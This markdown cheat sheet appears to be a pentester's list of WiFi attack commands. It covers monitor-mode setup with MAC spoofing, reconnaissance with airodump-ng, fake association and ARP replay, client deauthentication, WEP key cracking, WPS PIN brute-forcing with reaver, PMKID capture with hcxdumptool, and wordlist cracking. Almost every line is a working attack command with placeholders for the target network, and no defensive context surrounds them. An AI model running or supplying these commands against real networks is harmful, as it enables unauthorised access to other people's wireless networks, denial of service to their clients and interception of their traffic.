# WiFi Cracking Commands

## Setup
```
ifconfig wlan0 down
```

```
airmon-ng check kill
```

Change MAC of monitor card

```
macchanger -r wlan0
```

```
iwconfig wlan0 mode monitor
```

```
ifconfig wlan0 up 
```

## Recon

list wifi APs

```
airodump-ng wlan0
```

Filter by encryption method

```
airodump-ng wlan0 --encrypt wep
```

filter by wifi type (example is capture 2.4 and 5GHZ)

```
airodump-ng wlan0 -b abg
``` 

filter out unassociated clients

```
airodump-ng wlan0 -a
```

Capture IVs from AP or list clients

```
airodump-ng --bssid <BSSID> -c <CHANNEL> -i wlan0 --write <filename>  
```

```
airodump-ng --bssid <BSSID> -c <CHANNEL> wlan0 --output-format <FORMAT e.g.> pcap --write <PATH/TO/FILE>
```

## Fake Association

```
aireplay-ng -1 0 -e <target ESSID> -a <target BSSID> -h <WiFi card BSSID> wlan0
```

```
aireplay-ng -1 6000 -o 1 -q 10 -e <target ESSID> -a <target BSSID> -h <WiFi card BSSID> wlan0
```

## ARP Replay

Replay ARPs to drive up IVs

```
aireplay-ng -3 -b <>target BSSID> -h <client BSSID> wlan0
```

#Deauth client (c) from AP (a) 

```
aireplay-ng -0 0 -a <BSSID> -c <CLIENT MAC> wlan0
```

Associate to AP (a)

```
aireplay-ng -1 0 -a <BSSID> wlan0
```

Extract WEP IVs from PCAP

```
ivstools --convert PCAP OUT.ivs
```

Merge IV files

```
ivstools --merge *.ivs /root/all-ivs.ivs
```

## WEP attacks

```
aircrack-ng (-K) -b <bssid> crack.cap
```

## WPS attacks

List APs with WPS enabled

```
wash -i wlan0
```

Brute-force WPS

```
reaver -i wlan0 -b <BSSID> -d 5 -N -S -vv --no-nacks
```

```
reaver -i wlan0 -c 1 -b TARGET_ROUTER_MAC -vv -L -N -d 15 -T .5 -r 3:20
```

## hcxdumptool <PMKID attack>

```
sudo hcxdumptool -o cap01.pcapng -i wlan0 --filterlist=filter.txt --filtermode=2 --enable_status=1 -c 1 #capture PMKIDS w/ hcxdumptool
```

```
sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z cap01.16800 cap01.pcapng #convert PCAPNG to Haschcat format
```

```
sudo hcxpcapngtool <INPUT FILE(S)> -o <OUTPUT FILE>
```

## Cracking syntax

Get a list of BSSIDs, SSIDs, and handshake counts for PCAP, select index to crack

```
aircrack-ng <path/to/pcap(s)/ -w /path/to/wordlists
```